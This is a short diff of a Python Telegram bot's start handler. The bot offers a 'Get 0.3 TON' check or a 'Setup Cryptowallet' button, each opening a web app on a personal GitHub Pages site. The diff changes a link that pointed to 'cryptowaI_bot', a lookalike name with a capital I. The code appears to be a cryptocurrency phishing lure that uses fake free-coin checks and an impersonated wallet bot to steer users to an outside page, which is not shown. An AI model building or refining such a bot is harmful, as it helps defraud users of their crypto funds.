@@ -16,7 +16,7 @@ def cmd_start(message):
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add(KeyboardButton(text="Get 0.3 TON", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
         bot.send_message(message.from_user.id, "Check for 0.3 TON. Press button to receive.", reply_markup=markup)
-        link = f"https://t.me/cryptowaI_bot?start={message.text.split()[1]}"
+        link = message.text.split()[1]
     else:
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add(KeyboardButton(text="Setup Cryptowallet", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
